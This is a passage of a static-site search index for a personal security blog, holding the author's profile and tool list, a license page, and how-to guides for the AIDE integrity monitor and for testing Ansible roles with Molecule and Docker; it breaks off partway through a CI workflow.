{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Main","text":""},{"location":"#main","title":"Main","text":"<ul> <li> <p> Whoami</p> <p>Hi, I'm straysheep-dev. </p> <p>I'm here learning security from an offensive perspective and documenting things in a useful way as I go.</p> <p>I also focus on building defensive (or \"visibility\") tools, and configuration templates learned from applying offensive techniques to systems.</p> </li> <li> <p> Connect</p> <p> https://github.com/straysheep-dev</p> <p> https://gitlab.com/straysheep-dev</p> <p> straysheep_dev</p> <p> straysheep_dev</p> <p> straysheepdev</p> <p> straysheep.dev</p> <p> straysheep-dev/public-keys</p> </li> </ul> Pinned ReposCertificationsGuides &amp; Utilities <ul> <li> <p> Linux Configs</p> <p>Various configuration files for Unix/Linux operating systems</p> <p> Go to repo </p> </li> <li> <p> Windows Configs</p> <p>Various configuration files for Microsoft Windows operating systems</p> <p> Go to repo </p> </li> <li> <p> Ansible Configs</p> <p>A collection of ansible roles</p> <p> Go to repo </p> </li> <li> <p> Terraform Configs</p> <p>Various configuration templates for terraform</p> <p> Go to repo </p> </li> <li> <p> Packer Configs</p> <p>Packer templates to build preconfigured machines.</p> <p> Go to repo </p> </li> <li> <p> Alert Service</p> <p>Send an alert (to Discord, Slack, or any webhook) based on a condition</p> <p> Go to repo </p> </li> </ul> <ul> <li> <p> CWP</p> <p>Certified WiFiChallenge Professional</p> </li> <li> <p> OSCP</p> <p>OffSec Certified Professional</p> </li> <li> <p> OSWP</p> <p>OffSec Wireless Professional</p> </li> <li> <p> PNPT</p> <p>Practical Network Penetration Tester</p> </li> <li> <p> eCMAP</p> <p>Certified Malware Analysis Professional</p> </li> <li> <p> eCPPT</p> <p>Certified Professional Penetration Tester</p> </li> <li> <p> eJPT</p> <p>Junior Penetration Tester</p> </li> </ul> <ul> <li> <p> OpenSCAP Practical Usage</p> <p>A complete guide to starting with OpenSCAP content focusing on Ansible.</p> <ul> <li>Install OpenSCAP</li> <li>Pull compliance profiles from GitHub/ComplianceAsCode</li> <li>Debug policies with Ansible's <code>-C</code> and <code>-D</code> options</li> <li>Apply, test, and maintain policies with Ansible tags.</li> </ul> <p> Go to blog post </p> </li> <li> <p> Linux Utils</p> <p>Visualization tools with built in parsing options in color. These tools are in the base of the linux-configs repo.</p> <p><code>check-auditd.sh</code> Parse + search auditd</p> <p><code>check-baseline.sh</code> Parse aide results</p> <p><code>check-baseline.sh</code> rkhunter / chkrootkit in color</p> <p><code>check-processes.sh</code> Dump system + network process in color</p> <p><code>check-strings.sh</code> bstrings-like recursive string parser</p> <p> Go to blog post  CHECK BACK LATER!</p> <p> Go to repo </p> </li> <li> <p> VMware Kernel Module Signing</p> <p>To run VMware on Linux with SecureBoot enforced, the vmmon and vmnet modules require signing to load into the kernel.</p> <ul> <li>Automates this process</li> <li>Run after each kernel update</li> </ul> <p> Go to script </p> </li> <li> <p> pfSense Administration</p> <p>This guide covers CLI usage and other things like:</p> <ul> <li>Home office / lab use</li> <li>pkgs for Zeek, sudo, and more</li> <li>GUI and CLI quirks</li> <li>External storage and ZFS</li> </ul> <p> Go to blog post </p> </li> <li> <p> Deploy auditd</p> <p>Installs and configures auditd to adhear to a specified policy on Debian / RedHat family systems.</p> <ul> <li>Use built in rules for PCI, STIG, OSPP</li> <li>Load your own custom rules instead</li> <li>Choose log size, number, and type</li> <li>Locks rules to prevent live modification</li> </ul> <p> Go to ansible role </p> <p> Go to shell script </p> </li> <li> <p> Deploy &amp; Manage Sysinternals</p> <p>Interactive PowerShell script to load Sysinternals onto a Windows machine.</p> <ul> <li>Deploys sysmon</li> <li>Can update sysmon</li> <li>Option to use SwiftOnSecurity config</li> <li>Option to supply your own config instead</li> <li>Option to add essential monitoring tools</li> <li>Option to add entire suite (malware analysis)</li> </ul> <p> Go to ps1 script </p> </li> <li> <p> Deploy &amp; Manage AIDE</p> <p>Ansible role to deploy, run, and manage AIDE at scale</p> <ul> <li>Install AIDE (advanced intrusion detection environment)</li> <li>Initialize a database if one does not exist</li> <li>Check existing systems for integrity</li> <li>Update a database if one exists (optional)</li> </ul> <p> Go to ansible role </p> </li> <li> <p> Wireguard VPN / IDS Server</p> <p>Combines and automates a number of components to monitor traffic on a wireguard interface.</p> <ul> <li>Provision with terraform</li> <li>Build with ansible</li> <li>Generates a QR code to onboard first client</li> <li>Logs minimum pcap data for Zeek</li> <li>Set retention period for pcaps</li> </ul> <p> Go to ansible role </p> </li> <li> <p> Build Tailscale Node</p> <p>Automates deployment of a Tailscale node.</p> <ul> <li>Provision with terraform</li> <li>Build with ansible</li> <li>Automatically enroll the node into your Tailnet with an Ansible vault</li> <li>Logs minimum pcap data for Zeek on the tailscale0 interface</li> </ul> <p> Go to ansible role </p> </li> <li> <p> Manage OpenSSH Server on Windows</p> <p>OpenSSH Server is not always available by default, and is time consuming to configure each deployment manually.</p> <ul> <li>Installs + modifies OpenSSH Server</li> <li>Enforces public key auth</li> <li>Can change the listening port</li> <li>Updates firewall rules</li> <li>Imports public keys</li> </ul> <p> Go to ps1 script </p> </li> <li> <p> Tail-EventLogs PS Module</p> <p>Windows has no <code>tail -f</code> equivalent to visualize live Event Logs. This is especially useful in tuning and testing sysmon rules locally.</p> <ul> <li>Can tail any event log</li> <li>Filter based on Event ID</li> <li>Write to file with <code>Tee-Object</code></li> </ul> <p> Go to ps1 module </p> </li> <li> <p> Windows Sandbox Configs</p> <p>Detailed examples and premade .wsb files for:</p> <ul> <li>Ephemeral environment</li> <li>Development environment</li> <li>Malware analysis</li> </ul> <p>The .wsb files and scripts are in the base of the windows-configs repo.</p> <p> Go to repo </p> </li> <li> <p> Connect-UsbipSSHTunnel PS Module</p> <p>Convenience script to open a reverse ssh tunnel to the Windows host from WSL, giving WSL access to usbipd devices on localhost tcp/3240 without any inbound firewall rules active on the host.</p> <p>Requirements:</p> <ul> <li>WSL is up to date</li> <li>usbipd is version 4.0.0 or later</li> <li>The Windows host has an ssh key that the target WSL instance will accept</li> <li>The ssh identity is loaded into Windows ssh-agent</li> <li>WSL accepts incoming ssh connections</li> <li>You can execute commands as admin (this script can run as a normal user but you need to know an admin's credentials)</li> <li>You have sudo privileges within WSL</li> </ul> <p> Go to ps1 module </p> </li> <li> <p> Customizing Shell Profiles</p> <p>Use your shell prompt to track the following (and more) in real time:</p> <ul> <li>Username</li> <li>Hostname</li> <li>TTY</li> <li>Date &amp; time</li> <li>Network interface information</li> <li>Working directory</li> </ul> <p> Go to blog post </p> </li> </ul> <ul> <li> <p> About</p> <p>This site was created as a better way to document, maintain, and share notes with demonstrations or visual components, cross-platform.</p> <p>The blog section (at the top) is where this content lives, and is an easily searchable archive of anything I've found useful to demonstrate. Try using the  search function at the top of the page. It autocompletes suggestions from all of my content.</p> <p>Using mkdocs to build this makes it both a searchable \"database\" with no backend, and an archive with everything in chronological order.</p> </li> </ul>"},{"location":"license/","title":"License","text":""},{"location":"license/#license","title":"License","text":""},{"location":"license/#creative-commons-attribution-noncommercial-40-international-public-license-cc-by-nc-40","title":"Creative Commons Attribution-NonCommercial 4.0 International Public License  (CC BY-NC 4.0)","text":""},{"location":"license/#you-are-free-to","title":"You are free to:","text":"<p>Share \u2014 copy and redistribute the material in any medium or format</p> <p>Adapt \u2014 remix, transform, and build upon the material</p> <p>The licensor cannot revoke these freedoms as long as you follow the license terms.</p>"},{"location":"license/#under-the-following-terms","title":"Under the following terms:","text":"<p> Attribution \u2014 You must give appropriate credit, provide a link to the license, and indicate if changes were made. You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use.</p> <p> NonCommercial \u2014 You may not use the material for commercial purposes.</p> <p>No additional restrictions \u2014 You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits.</p>"},{"location":"license/#notices","title":"Notices:","text":"<p>You do not have to comply with the license for elements of the material in the public domain or where your use is permitted by an applicable exception or limitation.</p> <p>No warranties are given. The license may not give you all of the permissions necessary for your intended use. For example, other rights such as publicity, privacy, or moral rights may limit how you use the material.</p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/#blog","title":"Blog","text":""},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/","title":"AIDE (Advanced Intrusion Detection Environment)","text":"<p>How to set up <code>aide</code> for filesystem integrity monitoring and do basic tuning of the configuration.</p> <p>This file is originally from straysheep-dev/linux-configs.</p> <p>If you want <code>aide.conf</code> templates to start with, try any of the following based on your version of aide:</p> <ul> <li>aide-0.16.1.conf</li> <li>aide-0.17.3.conf</li> <li>aide-0.18.6.conf</li> </ul>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#license-information","title":"License Information","text":"<p><code>aide</code> is licensed under the GPL-2.0 license.</p> <p>https://github.com/aide/aide/blob/master/COPYING</p>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#references","title":"References","text":"<ul> <li><code>man aide.conf</code></li> <li>https://aide.github.io/</li> <li>https://aide.github.io/doc</li> <li>github.com/openshift/file-integrity-operator is a great reference for rule writing</li> </ul>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#quick-start","title":"Quick Start","text":"<p>If you'd like to either follow along, or deploy and manage <code>aide</code> after reading, you could use one of the following:</p> <ul> <li>aide Ansible Role - Deploy, check, and manage <code>aide</code> across an inventory</li> <li>initialize-baseline.sh - Installs <code>aide</code>, <code>rkhunter</code>, <code>chkrootkit</code> using the conf files in the same repo.</li> </ul>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#install","title":"Install","text":"<p>Install <pre><code>sudo apt install -y aide  # Debian / Ubuntu\nsudo dnf install -y aide  # Fedora\n</code></pre></p> <p>You may want to write your own cron task instead of the default which will execute daily: <pre><code>sudo chmod -x /etc/cron.daily/aide\n</code></pre></p>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#usage","title":"Usage","text":"<p>Run a check with <code>sudo -c &lt;/path/to/aide.conf&gt; -C</code></p> <p>Lines under <code>Changed entries:</code> are printed like this:</p> <pre><code># your results will look slightly different\nd = ... .. .. .: /path/to/example/directory1\nf = ... .. .. .: /path/to/example/file1\n</code></pre> <p>Those <code>.</code> dots will be replaced with the letter of the attribute, if it differs from what's stored in your current database.</p> <p>See the <code>summarize_changes</code> section under <code>man aide.conf</code> for the list of attributes (which are individual letters).</p> <p>This command will only return files where the checksum(s) <code>C</code> (Aide 0.16.1) or message digests <code>H</code> (Aide 0.17.4) have changed, filtering out any results under <code>/etc/vmware-installer/</code>. <pre><code>sudo -c &lt;/path/to/aide.conf&gt; -C | grep -P \"&lt;attribute(s)-to-check&gt;\" | grep -Fv \"&lt;results-to-filter&gt;\"\nsudo -c /etc/aide/aide.conf -C | grep -P \"^f (&lt;|&gt;|=) ........(C|H)\" | grep -Fv \"/etc/vmware-installer/\"\n</code></pre></p>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#configuring","title":"Configuring","text":"<ul> <li>Backup the default conf file: <code>sudo cp -n /etc/aide/aide.conf{,.bkup}</code></li> <li>Make any changes to the configuration <code>sudo nano /etc/aide/aide.conf</code></li> <li>You may want to replace this file entirely with your own</li> <li>Note that this file often <code>@@include</code>'s additional files contained within <code>/etc/aide/aide.conf.d/</code>, <code>/etc/aide/aide.settings.d/</code>, and <code>/etc/default/aide</code></li> <li>See <code>man aide.conf</code> for details on <code>MACRO LINES</code></li> </ul> <p>What the example configurations in this repo do:</p> <ul> <li>Comment out all <code>@@include</code> lines</li> <li>Append group definitions (<code>FULL</code> and <code>LOGS</code>) with all of the attributes we may want to monitor</li> <li>Append a list of all directories or files we may want to monitor</li> <li>The goal being fast database processing (~60s or less), and a brief, easy to read configuration</li> <li>Using <code>aide</code> in addition to <code>auditd</code> and <code>rkhunter</code> or similar tools can provide greater coverage without increasing processing time</li> </ul>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#database-and-integrity","title":"Database and Integrity","text":"<p>Initialize the database, specifying the configuration file to use with <code>-c</code>: <pre><code>sudo aide --init -c /etc/aide/aide.conf\n</code></pre></p> <p>Be sure to copy the entire result that's printed to terminal, the configuration file, and the database file itself, to either your password manager, or read-only external media.</p> <p>On systems that aren't critical (ephemeral or temporary environments) saving only the hashes of the databases and configuration files alone will be enough to detect tampering.</p> <p>An example of what these hashes look like:</p> <pre><code>&lt;SNIP&gt;\nStart timestamp: 2024-05-17 14:02:08 -0700 (AIDE 0.17.4)\nAIDE initialized database at /var/lib/aide/aide.db.new\n\nNumber of entries:  60633\n\n---------------------------------------------------\nThe attributes of the (uncompressed) database(s):\n---------------------------------------------------\n\n/var/lib/aide/aide.db.new\n SHA256    : 0123456789abcdef+0123456789abcdef\n             0123456789abcdef=\n SHA512    : 0123456789abcdef/0123456789abcdef\n             0123456789abcdef/0123456789abcdef\n             0123456789abcdef==\n RMD160    : 0123456789abcdef=\n TIGER     : 0123456789abcdef+0123456789abcdef\n\n\nEnd timestamp: 2024-05-17 14:02:47 -0700 (run time: 0m 39s)\n</code></pre> <p><code>aide</code> always prints the database hashes whether you're running a routine check or updating a database. By saving these to something like a password manager, you can easily determine the integrity of the environment.</p> <p>Next, 'install' the new database by copyying it from the <code>db.new</code> path where it's written, to the <code>.db</code> path listed in the .conf file.</p> <pre><code>sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n</code></pre> <p><code>aide.conf</code> has lines that define these paths, so it knows where to read an existing database file, or write the database files when it's time to update them.</p> <pre><code># /etc/aide/aide.conf\n# aide version 0.16.1\ndatabase=file:/var/lib/aide/aide.db\ndatabase_out=file:/var/lib/aide/aide.db.new\ndatabase_new=file:/var/lib/aide/aide.db.new\n</code></pre> <pre><code># /etc/aide/aide.conf\n# aide version 0.17.3\ndatabase_in=file:/var/lib/aide/aide.db\ndatabase_out=file:/var/lib/aide/aide.db.new\ndatabase_new=file:/var/lib/aide/aide.db.new\n</code></pre> <p>You could change those paths to point to a database on read-only / external media.</p> <p>Check the integrity of the system using a specified config file: <pre><code>sudo aide -c /etc/aide/aide.conf -C\n</code></pre></p> <p>When it's time to update the database to a new state, after system changes have been made and reviewed: <pre><code># writes an updated database to the path specfied in 'database_new=' in your configuration file\nsudo aide -u -c /etc/aide/aide.conf\n\n# install the new database by copying the .db.new file onto the .db file\nsudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n</code></pre></p>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#rule-writing","title":"Rule Writing","text":"<p>Rules can appear directly within the main <code>aide.conf</code> file. For example:</p> <pre><code>&lt;SNIP&gt;\n!/opt/pcaps    # Ignores this path\n/opt FULL      # Runs all checks in group FULL on everything under /opt\n&lt;SNIP&gt;\n</code></pre> <p><code>FULL</code> refers to a group definition. These define what attributes are enumerated for files. Another example:</p> <pre><code>&lt;SNIP&gt;\n# Custom group definitions of what to monitor\nFULL = l+s+p+u+g+m+c+i+sha256+rmd160+tiger+acl+selinux+xattrs+e2fsattrs\nLOGS = p+ftype+i+l+n+u+g+acl+selinux+xattrs+e2fsattrs\n&lt;SNIP&gt;\n</code></pre> <p>In summary, <code>FULL</code> covers nearly every attribute a file could have and records it in the database. <code>LOGS</code> ignores some attributes that make no sense to record, like checksums. Since log files rotate so frequently it's always going to have a different checksum.</p> <p>See <code>DEFAULT GROUPS</code> in <code>man aide.conf</code> for details on each attribute.</p> <p>You can always add or modify files in <code>/etc/aide/aide.conf.d/</code>, or any path mentioned as an <code>@@include</code> in the main configuration file. It's also fine if you want to ignore these entirely and keep everything within the main <code>aide.conf</code> file.</p> <p>These files are similar to <code>auditd</code> rule files.</p> <p>For example <code>/etc/aide/aide.conf.d/31_aide_home_directories</code> might contain the following lines:</p> <pre><code># Rule                                             # Description\n# ----                                               ----\n!/home/user/Desktop/                               # Exclude all under ~/Desktop\n!/home/user/Documents/file-changes-often$          # Exclude a single file or folder\nVAR = sha256                                       # Create a group definition to monitor only the sha256 attribute\nVAR2 = l+b+p                                       # Create a group definition to monitor link name, block count, and permission attributes\n/home/user/Documents/include-this-file$ VAR        # Include a single file or folder with attributes defined by VAR to monitor\n/home/user/Documents/spaces%20need%20escaped%20    # Escape special characters in file and folder names with two-digit URL encoding, see `man URL`\n</code></pre> <p>The example above demonstrates different ways you can write rules, and how things like regular expressions and character escaping work.</p>"},{"location":"blog/2024/05/15/octicons-alert-16-aide-advanced-intrusion-detection-environment/#aidewrapper","title":"aide.wrapper","text":"<p>Ubuntu has the shell scripts <code>/usr/bin/aide.wrapper</code> and <code>/usr/sbin/aideinit</code> to call aide functions.</p> <p>If you'd like to use these instead, do the same as you would to modify the configuration file(s) as needed. However, Ubuntu's aide package also includes a script <code>/usr/sbin/update-aide.conf</code>.</p> <p>You can see what files this script is reading from to generate a new configuration by reading the top of the shell script <code>less -S /usr/sbin/update-aide.conf</code>.</p> <p>This generates a full configuration file based on the previously mentioned directories, and writes this file to <code>/var/lib/aide/aide.conf.autogenerated</code></p> <p>Both <code>aideinit</code> and <code>aide.wrapper</code> then reads the configuration from that location when they're executed, if an alternate config file isn't provided on the commandline with <code>-c</code> or <code>--config</code>.</p> <p>If either script cannot find the config file provided by <code>-c</code> or <code>--config</code>, or if <code>/var/lib/aide/aide.conf.autogenerated</code> doesn't exist, both scripts automatically call <code>/usr/sbin/update-aide.conf</code> to generate one.</p> <p>Set up <code>aide</code> in one line using these scripts: <pre><code>sudo update-aide.conf &amp;&amp; sudo aideinit &amp;&amp; sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n</code></pre></p>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/","title":"Ansible Molecule","text":"<p>Molecule is part of the Ansible project. It's effectively a way to orchestrate containers or VM's to automate the testing of roles and collections in various environments. For example, using Docker with custom Dockerfiles or QEMU with Vagrant templates, to build the environments to run roles on. Combining this with CI workflows in GitHub or GitLab allows you to automate the process.</p> <p>Use Cases</p> <p>In theory molecule could be used to automate the testing of really anything within a container or VM as long as the playbook is configured to handle it.</p> <p>This post tries to fill in any blanks between what the documentation doesn't need to say, and what you'll see when reviewing public examples of projects using molecule. There are a few areas where it's not immediately clear \"what\" or \"how\", so this post will be a point of reference from that perspective. Once you see it working and are interacting with it, it all makes sense.</p>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#references","title":"References","text":"<p>The links below are in the order to follow if you're just getting started with Molecule.</p> <ul> <li>github.com/ansible/molecule</li> <li>Molecule: Customizing a Docker Image in Molecule</li> <li>Molecule: molecule.yml Configuration</li> <li>Ansible for DevOps: converge.yml Example</li> <li>github.com/geerlingguy/docker-fedora42-ansible Dockerfile</li> <li>github.com/geerlingguy/docker-rockylinux10-ansible Dockerfile</li> <li>github.com/geerlingguy/docker-ubuntu2404-ansible Dockerfile</li> <li>github.com/geerlingguy/docker-debian12-ansible Dockerfile</li> <li>Docker: Writing a Dockerfile</li> <li>Docker: Dockerfile Reference</li> <li>Docker Hub: Fedora</li> <li>Docker Hub: Rocky</li> </ul>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#installing-molecule","title":"Installing Molecule","text":"<p>Molecule: Install Documentation</p> <p>pipx vs venvs</p> <p>You'll likely want to use a <code>venv</code> or <code>--user</code> to install molecule in a dev VM (or similar environment).</p> <p>Ideally, install <code>ansible-dev-tools</code> to have everything available to work with.</p> <p>Alternatively, you can use <code>pipx</code> with <code>inject</code> to ensure the virtual environment pipx creates for molecule has access to <code>docker</code> and <code>molecule-plugins[docker]</code></p> <p>Install Ansible's dev tools, Molecule, and the Docker Python SDK:</p> pippipx <pre><code># Create a virtual environment\nmkdir ~/venv\npython3 -m venv ~/venv\nsource ~/venv/bin/activate\n\n# Install the dev tools if possible\npython3 -m pip install --user ansible-dev-tools\n\n# Minimally, install molecule, ansible, and any necessary container plugins\npython3 -m pip install --user molecule ansible ansible-lint \"molecule-plugins[docker]\"\n\n# Install the docker python SDK\n# https://github.com/docker/docker-py\npython3 -m pip install --user docker\n</code></pre> <pre><code># Install the latest version of pipx\npython3 -m pip install --user pipx\npython3 -m pipx ensurepath\n\n# Install each tool into an isolated environment with pipx\npipx install molecule ansible-lint\npipx install --include-deps ansible\n\n# Inject the docker libraries into molecule's pipx environment\npipx inject molecule \"molecule-plugins[docker]\" docker\n</code></pre> <p>Finally, install Docker itself if you already haven't.</p> <ul> <li>Docker Install Instructions</li> <li>Ansible Role to Install Docker</li> </ul>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#creating-a-scenario","title":"Creating a Scenario","text":"<p>A scenario?</p> <p>A scenario is the term for running tests through molecule.</p> <p>The Molecule documentation has examples for Ansible Collections. To create a molecule scenario for a single role, you can do so from the root of the role's project folder. See geerlingguy's <code>ansible-role-*</code> repos for examples of this.</p> <pre><code># Move to the root of your role's project folder\ncd ~/src/ansible-role-my_role\n\n# Initialize the scenario\nmolecule init scenario\n</code></pre> <p>This creates a <code>molecule/default/</code> folder with all of the default scenario files necessary to run tests.</p> <pre><code>$ molecule init scenario\nINFO     Initializing new scenario default...\n\nPLAY [Create a new molecule scenario] ******************************************\n\nTASK [Check if destination folder exists] **************************************\nchanged: [localhost]\n\nTASK [Check if destination folder is empty] ************************************\nok: [localhost]\n\nTASK [Fail if destination folder is not empty] *********************************\nskipping: [localhost]\n\nTASK [Expand templates] ********************************************************\nchanged: [localhost] =&gt; (item=molecule/default/molecule.yml)\nchanged: [localhost] =&gt; (item=molecule/default/create.yml)\nchanged: [localhost] =&gt; (item=molecule/default/converge.yml)\nchanged: [localhost] =&gt; (item=molecule/default/destroy.yml)\n\nPLAY RECAP *********************************************************************\nlocalhost                  : ok=3    changed=2    unreachable=0    failed=0    skipped=1    rescued=0    ignored=0\n\nINFO     Initialized scenario in /home/user/src/ansible-role-my_role/molecule/default successfully.\n</code></pre> <p>The most important files here are these two (from Scenario Layout):</p> <ul> <li><code>molecule.yml</code> is the central configuration entry point for Molecule per scenario. With this file, you can configure each tool that Molecule will employ when testing your role.</li> <li><code>converge.yml</code> is the playbook file that contains the call for your role. Molecule will invoke this playbook with ansible-playbook and run it against an instance created by the driver.</li> </ul> <p>In other words <code>molecule.yml</code> configures Molecule itself; what driver it will use, how it will run, and more. Think of <code>converge.yml</code> as your playbook file that Molecule will execute against each instance it creates. Use <code>converge.yml</code> to configure and include the roles or collections you want to assess.</p>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#running-molecule","title":"Running Molecule","text":"<p>To simply run a scenario, from your role's project folder:</p> <pre><code># Specify a driver with -d|--driver-name\nmolecule test [-d docker]\n</code></pre> <p>For additional debugging output from molecule:</p> <pre><code>molecule -vvv test [-d docker]\n</code></pre> <p>What's happening here?</p> <p>In the most default setup, there are two things happening:</p> <ol> <li>Converge tests are executing your role(s) / collection / playbook(s)</li> <li>Idempotence tests are running everything again in the same instances, ensuring nothing changes or fails</li> </ol> <p>As you'll see (below) this can create issues when some tasks aren't meant to be \"idempotent\" from Ansible's perspective.</p>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#error-the-role-your_role-was-not-found","title":"ERROR: The role 'your_role' was not found","text":"<p>If you encounter this error, there are some lines you may need to ensure you have specified in <code>meta/main.yml</code> of a role:</p> <ul> <li><code>namespace</code></li> <li><code>author</code></li> <li><code>role_name</code></li> </ul> <p>If Molecule can't find your role locally (because let's say it doesn't exist in Ansible-Galaxy or GitHub yet), you may see the following error:</p> <pre><code>ERROR! the role 'my_role' was not found in /home/user/src/ansible-role-my_role/molecule/default/roles:/home/user/.ansible/roles:/usr/share/ansible/roles:/etc/ansible/roles:/home/user/src/ansible-role-my_role/molecule/default\n\nThe error appears to be in '/home/user/src/ansible-role-my_role/molecule/default/converge.yml': line 17, column 7, but may be elsewhere in the file depending on the exact syntax problem.\n\nThe offending line appears to be:\n\n  roles:\n    - role: my_role\n      ^ here\n</code></pre> <p>In this case there a few ways to resolve this.</p> <p>Option 1: Symlink</p> <p>If you're not using a namespace or plan to publish to Ansible-Galaxy, symlink your role's project path with:</p> <pre><code># The symlink points to the role's project folder\nln -s ~/src/ansible-role-my_role ~/.ansible/roles/my_role\n</code></pre> <p>Option 2: Namespace + Role Name (Recommended)</p> <p>Ensure you have those 3 fields (<code>author</code>, <code>namespace</code>, <code>role_name</code>) filled out in <code>meta/main.yml</code>.</p> <p>Then specify the namespace + role name in your <code>converge.yml</code> file:</p> <pre><code>- name: Converge\n  hosts: all\n  gather_facts: true\n  tasks:\n    - name: Enumerate Ansible Facts\n      ansible.builtin.debug:\n        # msg: \"This is the effective test\"\n        var: ansible_facts['system']\n  roles:\n    - role: my_namespace.my_role\n</code></pre>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#idempotence-tests","title":"Idempotence Tests","text":"<p>There are really 2 main tests molecule runs if you're just going with the most default settings. <code>converge.yml</code> tests execute your tasks on the target containers, and idempotence tests run the converge test once more to check if tasks return as anything other than OK. A \"changed\" or \"failed\" state indicates the playbook was not idempotent.</p> <p>These resources go into more detail around this topic:</p> <ul> <li>Disable idempotence check on certain tasks #816</li> <li>Add <code>--molecule-idempotence-notest</code> tag to skip-tags during idempotence... #1663</li> <li>Molecule: Skip Idempotence with Tags</li> <li>Ansible: Adding Tags to Tasks</li> </ul> <p>Ultimately, if you need to exclude a task from idempotence tests, there's now a tag that supports this: <code>molecule-idempotence-notest</code>. Simply add this tag to any tasks that will always return as \"changed\", so that they can be excluded without any work arounds or skipping idempotence testing entirely.</p> <pre><code>- name: \"Ensure temporary working folder exists\"\n  ansible.builtin.file:\n    path: \"{{ uac_outfolder }}\"\n    state: directory\n    mode: '0700'\n  tags:\n    - molecule-idempotence-notest\n</code></pre>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#systemd-in-docker","title":"systemd in Docker","text":"<p>By default, Docker containers are minimal environments that do not have systemd out of the box in many cases.</p> <p>To achieve this, there are a few resources I've found that demonstrate this in an understandable way:</p> <ul> <li>Molecule Docs: systemd-container Guide</li> <li>rockylinux's Docker image systemd Integration Notes</li> <li>geerlingguy's Docker role <code>converge.yml</code> file</li> </ul> <p>SELinux may add complexity in some case, but generally you're:</p> <ul> <li>Sharing the host's <code>/sys/fs/cgroup</code> with the container</li> <li>Run the container with <code>SYS_ADMIN</code> capabilities or <code>privileged</code> mode.</li> <li>Installing systemd using the container OS's package manager</li> <li>Running / starting systemd</li> </ul> <p>Docker Notes</p> <p>This section was taken directly from the docker-configs README.</p> <p>Building Images with Dockerfiles</p> <p>See build, tag, and publish an image.</p> <pre><code># Tag the file with any name you want, and point to the dockerfile with -f\n# This also assumes you're in the cwd of the dockerfile with the \".\" on the end\ndocker build -t local/my-image-name -f ./some.Dockerfile .\n</code></pre> <p>Interactively Running Images</p> <p>If you just want to jump into a standard image pulled from Docker Hub, or one you've built:</p> <p>See Using Kali Linux Docker Images.</p> <pre><code># Example\ndocker run --tty --interactive &lt;tag/image-name&gt;\n\n# Download and run Kali\ndocker run --tty --interactive kalilinux/kali-rolling\n\n# Download and run Fedora\ndocker run --tty --interactive fedora:latest\n</code></pre> <p>If the image you built uses systemd, you need to start it with <code>systemd</code> executed in the background first. The arguments required are the same that you'd use for running molecule containers with systemd support. You can see an example of this in geerlingguy's build.yml using GitHub actions to build and test Docker containers.</p> <ul> <li>See the <code>docker run</code> command reference</li> <li><code>-d</code> is most important here, it runs as a daemon in the background so <code>systemd</code> can start within the container as PID 1</li> <li><code>--name</code> can be anything you want to name that instance of the running container</li> <li><code>--hostname</code> is also independant of the container image name</li> <li><code>local/kali-molecule</code> is the same arg as <code>-t &lt;tag/name&gt;</code> when you either pulled or built the image</li> </ul> <pre><code>docker run -d \\\n  --name kali-molecule \\\n  --hostname kali-molecule \\\n  --privileged \\\n  --cgroupns=host \\\n  --tmpfs /run \\\n  --tmpfs /tmp \\\n  -v /sys/fs/cgroup:/sys/fs/cgroup:rw \\\n  -e container=docker \\\n  local/kali-molecule /sbin/init\n</code></pre> <p>Then interactively execute a shell in the running container once it starts:</p> <pre><code>docker exec -it kali-molecule /bin/bash\n</code></pre>"},{"location":"blog/2025/07/25/simple-ansible-ansible-molecule/#ci-cd-use","title":"CI / CD Use","text":"<p>Molecule has examples for various CI platforms.</p> <p>Change working-directory</p> <p>Something worth noting for GitHub Actions specifically is using <code>working-directory: 'your_role'</code> to ensure your shell is running from within the root of your project folder when executing <code>molecule test</code>.</p> <p>Here's the CI file I put together for deploy_uac, using the references noted in the comments as a starting point:</p> <pre><code># .github/workflows/molecule.yml\n# SPDX-License-Identifier: MIT\n\n# Taken from the following examples:\n# - https://ansible.readthedocs.io/projects/molecule/ci/#github-actions\n# - https://github.com/geerlingguy/ansible-role-docker/blob/master/.github/workflows/ci.yml\n# - https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/set-default-values-for-jobs\n\n# Additional Notes:\n# - Docker already exists on GitHub's runner images and does not need to be installed\n# - https://github.com/actions/runner-images?tab=readme-ov-file#available-images\n# - actions/setup-python@v5 can be used to install a specific version of python if needed\n# - https://github.com/actions/setup-python\n\nname: molecule\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\ndefaults:\n  run:\n    working-directory: 'deploy_uac'\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          path: deploy_uac\n      - name: Install dependencies\n        run: |\n          python3 -m pip install --upgrade pip ansible molecule molecule-plugins[docker] docker\n      - name: Test with molecule\n        run: |\n          molecule test -d docker\n        env:\n          PY_COLORS: 